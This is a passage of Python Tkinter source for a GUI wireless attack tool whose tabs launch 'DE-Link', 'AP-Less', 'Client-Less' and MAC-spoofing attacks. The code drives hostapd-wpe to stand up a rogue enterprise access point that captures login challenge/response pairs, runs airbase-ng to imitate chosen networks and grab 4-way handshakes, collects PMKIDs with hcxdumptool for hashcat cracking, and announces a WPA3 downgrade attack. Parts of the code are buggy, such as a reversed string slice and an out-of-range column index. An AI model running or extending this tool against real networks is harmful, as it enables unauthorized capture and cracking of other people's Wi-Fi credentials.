        scanningstoplabel = ttk.Label(tab2, text='(stopscan)', font=("Helvetica", 20))
        scanningstoplabel.grid(column=6, row=0, padx=10, pady=4)
        print("stop")
    def rescanloop():
        if s==0:
            aa=tk.Toplevel()
            aa.title('scanning')
            aa.destroy()
            rescan()
            scanningdonelabel = ttk.Label(tab2, text='scanndone', font=("Helvetica", 20))
            scanningdonelabel.grid(column=6, row=0, padx=8, pady=4)
            main.after(int(n),rescanloop)
        

    if n =="stop":
        stopit()
    else:
        
        global s
        s=0
        rescanloop()
        


        
scanloop=ttk.Combobox(tab2,values=["30","20","10","stop"])
scanloop.grid(column=2, row=0, padx=8, pady=4)
scanloop.bind("<<ComboboxSelected>>", scaningloop)


#---------------Tab3---------APless------------------#

def aplesstreeveiwallnetwork():
    topcolumns = ("BSSID","channel","Speed","Privacy","Authentication","beacons","ESSID")
    treeviewtop = ttk.Treeview(tab3, height=20, show="headings", columns=topcolumns)  # 表格

    treeviewtop.column("BSSID", width=150, anchor='center') # 表示列,不顯示
    treeviewtop.column("channel", width=100, anchor='center')
    treeviewtop.column("Speed", width=100, anchor='center')
    treeviewtop.column("Privacy", width=100, anchor='center')
    treeviewtop.column("Authentication", width=100, anchor='center')
    treeviewtop.column("beacons", width=100, anchor='center')
    treeviewtop.column("ESSID", width=220, anchor='center')
    

    treeviewtop.heading("BSSID", text="BSSID") # 顯示錶頭
    treeviewtop.heading("channel", text="channel")
    treeviewtop.heading("Speed", text="Speed")
    treeviewtop.heading("Privacy", text="Privacy")
    treeviewtop.heading("Authentication", text="Authentication")
    treeviewtop.heading("beacons", text="beacons")
    treeviewtop.heading("ESSID", text="ESSID")

    treeviewtop.grid(row=2, column=0, columnspan=50, rowspan=10, pady=10,sticky=tk.W)

    global applesstreeviwecount
    applesstreeviwecount=int(applesstreeviwecount)
    if applesstreeviwecount>0:

                        items = treeviewtop.get_children()
                        [treeviewtop.delete(item) for item in items]
                        applesstreeviwecount=applesstreeviwecount - 1
                        print ('top')
                    
    open1=open("viewtreeapless.txt","rb")
                      

    read= open1.read()
    tvlist1=read.decode().split("\n")
    for n in tvlist1:
                        a=str(n)
                        BSSID=n[4:21]
                        channel=n[28:31]
                        Speed=n[39:43]
                        Privacy=n[53:64]
                        Authentication=n[75:79]
                        beacons=n[87:91]
                        ESSID=n[93:]
                        treeviewtop.insert('','end',values=(BSSID,channel,Speed,Privacy,Authentication,beacons,ESSID))
                        
                
                
    

                 
    
    applesstreeviwecount=applesstreeviwecount+1



    
    def aplesstreeviewClick(event):
                    global aplessv
                    global delinkfalag
                    delinkfalag=1
                    aplessfalagopen=open("aplessfalag.txt","w+")
                    tabControl.tab(5, state="normal")
                    tabControl.select(loadpage)  
                    tabControl.tab(2, state="disabled")
                    
                                    
                                        
                    print ('单击')
                    for item in treeviewtop.selection():
                        item_text = treeviewtop.item(item,"values")
                        if str("3") in item_text[3]:
                                    tk.messagebox.showinfo('info','Dectected the WAP3 device,will use downgrade attack')
                        global aplessv
                        aplessv=str(item_text[4])
                        print("what is this "+aplessv)
                    print(str(aplessv))  
                    if aplessv in " MGT ":
                            print("start MGT")
                            aa="sed -i '15c ssid="+item_text[10]+"' /etc/hostapd-wpe/hostapd-wpe.conf"
                            os.system(aa) 
                            os.system("airmon-ng check kill")
                            tk.messagebox.showinfo('info','Now pls wait for someonelogin')
                            print("start enterpsise")
                            def runenter():
                                os.system("python3.7 enter.py")
                            thread_5 = threading.Thread(target=runenter)
                            thread_5.start()
                            
                            print("end")
                            os.system("> enterflag.txt")

                            def enterflagcheck():
                                print("waiting")
                                enterflag=open("enterflag.txt","r+")
                                read=enterflag.read()
                                print(read)
                                read1=str(read)
                                a=str("a")
                                
                                if a in read1:
                                    print("yup")
                                    tabControl.tab(8, state="normal")
                                    tabControl.select(successtab)  
                                    tabControl.tab(5, state="disabled")
                                    tk.messagebox.showinfo('info','Challenge and Response captured')
                                else:
                                    print("rerun")
                                    main.after(500,enterflagcheck)
                                enterflag.truncate()
                                print("check")
                            enterflagcheck()
                                    
                    elif aplessv in "  PSK  ":   


                            aplesstxt=open("aplessruntxt.txt","w+")
                            e="airbase-ng -c "+ item_text[1]+" -a "+item_text[0]+' -e "' + item_text[6] + '" -W 1 -z 2 -F apless '+ selectwaln
                            print(e)
                            aplesstxt.write(e)
                            aplesstxt.close()
                            def runapless():
                                os.system("python3.7 runapless.py")
                            thread_5 = threading.Thread(target=runapless)
                            thread_5.start()
                            def stopit():
                                    global aplessfalag
                                    aplessfalag=1
                                    print("stop")
                            def rescanloop():
                                    if aplessfalag==0:
                                        aplessfalagcheck=open("aplessfalag.txt","r+")
                                        read2= aplessfalagcheck.read()
                                        tvlist2=read2.split("\n")
                                        if tvlist2[0]=="aaa":
                                            stopit()
                                        
                                        main.after(5000,rescanloop)
                                    else:
                                        tabControl.tab(8, state="normal")
                                        tabControl.select(successtab)  
                                        tabControl.tab(5, state="disabled")
                                        tk.messagebox.showinfo('info','4-way handshake captured')
                                        aplessfalagopen.truncate()
                            rescanloop()
                    
                    
                    
    treeviewtop.bind('<Double-1>', aplesstreeviewClick)



    

sca.getall()
apless.makeaplesslist()
aplesstreeveiwallnetwork()
#updateapless()


#---------------Tab7---------Clientless------------------#

def Clientlesstreeveiwallnetwork():
    global clienttreeviewtop
    clienttopcolumns = ("BSSID","channel","Speed","Privacy","Authentication","beacons","ESSID")
    clienttreeviewtop = ttk.Treeview(clentless, height=20, show="headings", columns=clienttopcolumns)  # 表格

    clienttreeviewtop.column("BSSID", width=150, anchor='center') # 表示列,不顯示
    clienttreeviewtop.column("channel", width=100, anchor='center')
    clienttreeviewtop.column("Speed", width=100, anchor='center')
    clienttreeviewtop.column("Privacy", width=100, anchor='center')
    clienttreeviewtop.column("Authentication", width=100, anchor='center')
    clienttreeviewtop.column("beacons", width=100, anchor='center')
    clienttreeviewtop.column("ESSID", width=200, anchor='center')
    

    clienttreeviewtop.heading("BSSID", text="BSSID") # 顯示錶頭
    clienttreeviewtop.heading("channel", text="channel")
    clienttreeviewtop.heading("Speed", text="Speed")
    clienttreeviewtop.heading("Privacy", text="Privacy")
    clienttreeviewtop.heading("Authentication", text="Authentication")
    clienttreeviewtop.heading("beacons", text="beacons")
    clienttreeviewtop.heading("ESSID", text="ESSID")
    
    clienttreeviewtop.grid(row=3, column=0, columnspan=50, rowspan=10, pady=10,sticky=tk.W)

    global clienttreeviwecount
    clienttreeviwecount=int(clienttreeviwecount)
    if clienttreeviwecount>0:

                        items = clienttreeviewtop.get_children()
                        [clienttreeviewtop.delete(item) for item in items]
                        clienttreeviwecount=clienttreeviwecount - 1
                        print ('top')
                    
    open1=open("connecttopdelink.txt","rb")
                      

    read= open1.read()
    tvlist1=read.decode().split("\n")
    for n in tvlist1:
                        BSSID=n[4:21]
                        channel=n[28:31]
                        Speed=n[39:43]
                        Privacy=n[54:42]
                        Authentication=n[75:79]
                        beacons=n[87:91]
                        ESSID=n[93:]
                        
                        clienttreeviewtop.insert('','end',values=(BSSID,channel,Speed,Privacy,Authentication,beacons,ESSID))
                
                
                
    

                 
    
    clienttreeviwecount=clienttreeviwecount+1
    def clientlesstreeviewClick(event):
        print("clienttreeviewtop start running")
        for item in clienttreeviewtop.selection():
            item_text = clienttreeviewtop.item(item,"values")
            global clientessid
            clientessid=item_text[6]
            print(item_text[0])
            string=re.sub(":", '',str(item_text[0]))
            print(string)
            newstring=string.strip()
            print(newstring)
            wirte =open("filter.txt","w+")
            wirte.write(newstring)
            wirte.close()
            clientosrunfirstline=" cp filter.txt /root/clientlessinstalltool/hcxdumptool/filter.txt  && rm filter.txt "
            os.system("airmon-ng start wlan0")
            os.system(clientosrunfirstline)
            os.system("cd /root/clientlessinstalltool/hashcat && rm wordlist.txt")
            print("asdasd")
            os.system("python3.7 clientless.py")
            os.system("cd /root/clientlessinstalltool/hcxdumptool && cp hash /root/clientlessinstalltool/hcxtools/hash")
            tk.messagebox.showinfo('info','PMKID captured')
            
            

            
                
                
                
    clienttreeviewtop.bind('<Double-1>', clientlesstreeviewClick)

def clienttreeescan():
    global delinkfalag
    delinkfalag=1
    
    sca.getall()
    
    Clientlesstreeveiwallnetwork()

clientresanbutton=ttk.Button(clentless, text='rescan',command=clienttreeescan)
clientresanbutton.grid(column=1, row=0, padx=8, pady=4)
Clientlesstreeveiwallnetwork()



#-------------#3--Tab9---------Attack way------------------#
attacklabel = ttk.Label(tab9, text='Select Attack Method')
attacklabel.grid(column=0, row=1, padx=8, pady=4)

def godelink():
    rescan()
    tabControl.tab(1, state="normal")
    tabControl.select(tab2)
    tabControl.tab(3, state="disabled")
def goapless():
    tabControl.tab(2, state="normal")
    tabControl.select(tab3)  
    tabControl.tab(3, state="disabled")

def goclientless():
    tabControl.tab(7, state="normal")
    tabControl.select(clentless)  
    tabControl.tab(3, state="disabled")

def gomacspoofing():
    tabControl.select(macpage)  

delinkbutton = ttk.Button(tab9, text='DE-Link',command=godelink)
delinkbutton.grid(column=0, row=2, padx=8, pady=4)

aplessbutton = ttk.Button(tab9, text='AP-Less ',command=goapless)
aplessbutton.grid(column=1, row=2, padx=8, pady=4)

clientbutton = ttk.Button(tab9, text='Client-Less ',command=goclientless)
clientbutton.grid(column=2, row=2, padx=8, pady=4)

macspoofingbutton = ttk.Button(tab9, text='MAC-Spoofing ',command=gomacspoofing)
macspoofingbutton.grid(column=3, row=2, padx=8, pady=4)

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
lbl = gif.ImageLabel(loadpage)
lbl.grid(column=0, row=1, padx=100, pady=100)
lbl.load('loading.gif')

success = gif.ImageLabel(successtab)
success.grid(column=0, row=2, rowspan=100,columnspan=100, padx=100, pady=100)
success.load('success.gif')





